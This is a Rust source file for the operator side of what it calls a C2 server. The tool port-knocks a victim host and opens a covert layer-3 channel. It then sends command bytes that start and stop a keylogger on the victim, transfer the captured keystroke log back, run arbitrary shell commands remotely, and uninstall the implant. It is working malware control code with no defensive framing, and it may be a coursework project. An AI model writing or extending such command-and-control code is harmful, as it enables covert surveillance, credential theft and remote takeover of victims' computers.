use std::io::{self, Write};
use std::net::{IpAddr, Ipv4Addr};
use std::thread;
use std::time::Duration;
use std::sync::atomic::Ordering;
use pnet::datalink;

mod port_knkr;
mod pcap_capture;
mod keylogger;
mod covert;

use port_knkr::KnockSession;
use pcap_capture::PcapHandle;
use covert::CovertChannel;

// CRITICAL: Must match Victim's command codes exactly
const CMD_START_LOGGER:     u8 = 0x10;
const CMD_STOP_LOGGER:      u8 = 0x20;
const CMD_UNINSTALL:        u8 = 0x30;
const CMD_REQUEST_KEYLOG:   u8 = 0x50;  // NEW - explicit keylog file request

#[derive(Debug, PartialEq)]
enum SessionState {
    Disconnected,
    Connected,
}

struct Commander {
    state: SessionState,
    victim_ip: Option<Ipv4Addr>,
    local_ip: Option<Ipv4Addr>,
    knock_session: Option<KnockSession>,
    pcap_handle: Option<PcapHandle>,
    covert_chan: Option<CovertChannel>,
}

impl Commander {
    fn new() -> Self {
        Self {
            state: SessionState::Disconnected,
            victim_ip: None,
            local_ip: None,
            knock_session: None,
            pcap_handle: None,
            covert_chan: None,
        }
    }

    pub fn run(&mut self) {
        println!("=== C2 Server (Layer 3) ===");
        loop {
            match self.state {
                SessionState::Disconnected => self.disconnected_menu(),
                SessionState::Connected => self.connected_menu(),
            }
        }
    }

    fn disconnected_menu(&mut self) {
        println!("\n--- Status: Offline ---");
        println!("1) Initiate session (Port Knock)");
        println!("0) Exit");

        match prompt("Selection > ").as_str() {
            "1" => self.initiate_connection(),
            "0" => std::process::exit(0),
            _ => println!("[!] Invalid selection"),
        }
    }

    fn connected_menu(&mut self) {
        println!(
            "\n--- Status: Connected to {} ---",
            self.victim_ip.map(|ip| ip.to_string()).unwrap_or("Unknown".into())
        );
        println!("1) Disconnect from victim");
        println!("2) Uninstall from victim");
        println!("3) Start keylogger on victim");
        println!("4) Stop keylogger on victim");
        println!("5) Run shell command on victim");
        println!("6) View Captured Keys");
        println!("7) Transfer key log file from victim");
        println!("8) Send file to victim              [partial - needs victim receive logic]");
        println!("9) Request arbitrary file from victim [placeholder]");

        match prompt("Selection > ").as_str() {
            "1" => self.disconnect(),
            "2" => self.uninstall(),
            "3" => self.start_keylogger(),
            "4" => self.stop_keylogger(),
            "5" => self.run_program(),
            "6" => self.view_keylog(),
            "7" => self.request_keylog_file(),
            "8" => self.send_file_to_victim(),
            "9" => self.request_arbitrary_file(),
            _   => println!("[!] Invalid selection"),
        }
    }

    fn initiate_connection(&mut self) {
        let ip_input = prompt("Enter target Victim IP [default: 127.0.0.1]: ");
        let target_ip = if ip_input.is_empty() {
            "127.0.0.1".parse::<Ipv4Addr>().unwrap()
        } else {
            match ip_input.parse::<Ipv4Addr>() {
                Ok(ip) => ip,
                Err(_) => { println!("[!] Invalid IP"); return; }
            }
        };

        match port_knkr::port_knock(target_ip) {
            Ok(session) => {
                println!("[+] Port knock successful.");
                self.victim_ip = Some(target_ip);

                let iface_name = Self::find_best_interface(target_ip).unwrap_or_else(|| "lo".to_string());
                let interfaces = datalink::interfaces();
                let interface = interfaces.into_iter().find(|i| i.name == iface_name).expect("Interface not found");

                let local_ip = interface.ips.iter()
                    .find_map(|ip| if let IpAddr::V4(v4) = ip.ip() { Some(v4) } else { None })
                    .unwrap_or(Ipv4Addr::new(127, 0, 0, 1));

                // Initialize L3 Covert Channel
                let (chan, rx) = CovertChannel::new(
                    local_ip,
                    target_ip,
                    session.tx_port,   // send to victim's rx port
                    session.rx_port    // listen on this port for victim's data
                );

                // Start listener thread → prints keys and will save files
                covert::start_listening(rx, chan.config.clone(), chan.running.clone());

                self.covert_chan = Some(chan);
                self.knock_session = Some(session);
                self.state = SessionState::Connected;
            }
            Err(e) => println!("[!] Knock failed: {}", e),
        }
    }

    fn start_keylogger(&mut self) {
        if let Some(ref mut chan) = self.covert_chan {
            println!("[*] Sending START_KEYLOGGER (burst for reliability)...");
            for i in 1..=6 {
                chan.send_byte(CMD_START_LOGGER);
                thread::sleep(Duration::from_millis(25));
                if i % 2 == 0 { print!("."); io::stdout().flush().unwrap(); }
            }
            println!("\n[+] Start command sent.");
        } else {
            println!("[!] No active session");
        }
    }

    fn stop_keylogger(&mut self) {
        if let Some(ref mut chan) = self.covert_chan {
            println!("[*] Sending STOP_KEYLOGGER (burst)...");
            for _ in 0..5 {
                chan.send_byte(CMD_STOP_LOGGER);
                thread::sleep(Duration::from_millis(30));
            }
            println!("[+] Stop command sent.");
        }
    }

    fn request_keylog_file(&mut self) {
        if let Some(ref mut chan) = self.covert_chan {
            println!("[*] Requesting keylog file transfer...");
            for _ in 0..6 {
                chan.send_byte(CMD_REQUEST_KEYLOG);
                thread::sleep(Duration::from_millis(35));
            }
            println!("[+] Request sent (burst x6). Waiting for transfer...");
            println!(" → Check terminal for progress. File should save to ./received/");
        } else {
            println!("[!] No active session");
        }
    }

    fn send_file_to_victim(&mut self) {
        println!("[!] Send file to victim - NOT FULLY IMPLEMENTED YET");
        println!("   This requires a new command byte (e.g. 0x60) and receive logic in victim.rs");
        println!("   For now: enter local path (demo only)");
        let path = prompt("Local file path to send > ");
        if path.is_empty() { return; }
        println!("[*] Would send: {}", path);
        // Future: chan.send_file(&path) after victim supports receiving
    }

    fn request_arbitrary_file(&mut self) {
        println!("[!] Request arbitrary file - NOT IMPLEMENTED YET");
        println!("   Requires new command + path string sending + victim-side read & send");
        let _ = prompt("Press ENTER to continue...");
    }

    fn view_keylog(&self) {
        println!("\n--- Keylogger Status ---");
        println!("[*] Real-time keys are printed by the listener thread.");
        println!("[*] Completed transfers are saved to ./received/ (if listener updated)");

        let path = "./data/pcaps/captured_keys.txt";
        if std::path::Path::new(path).exists() {
            println!("[*] Local fallback log found: {}", path);
            if let Ok(content) = std::fs::read_to_string(path) {
                println!("\nLast captured content (local):\n{}", content);
            } else {
                println!("[!] Could not read local log");
            }
        } else {
            println!("[!] No local log file found yet.");
        }
    }

    fn run_program(&mut self) {
        let cmd = prompt("Remote Shell Command > ");
        if cmd.is_empty() { return; }

        if let Some(ref mut chan) = self.covert_chan {
            println!("[*] Sending command...");
            chan.send_command(&cmd);
            println!("[+] Command sent. Output should appear in terminal.");
        }
    }

    fn uninstall(&mut self) {
        if let Some(ref mut chan) = self.covert_chan {
            println!("[!] Sending UNINSTALL command...");
            chan.send_byte(CMD_UNINSTALL);
            self.disconnect();
        }
    }

    fn disconnect(&mut self) {
        println!("[*] Cleaning up session...");
        if let Some(ref chan) = self.covert_chan {
            chan.stop();
        }
        self.knock_session = None;
        self.covert_chan = None;
        self.state = SessionState::Disconnected;
        println!("[+] Session closed.");
    }

    fn find_best_interface(target_ip: Ipv4Addr) -> Option<String> {
        let interfaces = datalink::interfaces();
        for iface in interfaces {
            if !iface.is_up() || iface.is_loopback() { continue; }
            for ip_net in &iface.ips {
                if let IpAddr::V4(_) = ip_net.ip() {
                    if ip_net.contains(IpAddr::V4(target_ip)) {
                        return Some(iface.name);
                    }
                }
            }
        }
        datalink::interfaces().into_iter()
            .find(|i| i.is_up() && !i.is_loopback())
            .map(|i| i.name)
    }
}

fn prompt(msg: &str) -> String {
    print!("{}", msg);
    io::stdout().flush().unwrap();
    let mut input = String::new();
    io::stdin().read_line(&mut input).unwrap();
    input.trim().to_string()
}

fn main() {
    let mut commander = Commander::new();
    commander.run();
}
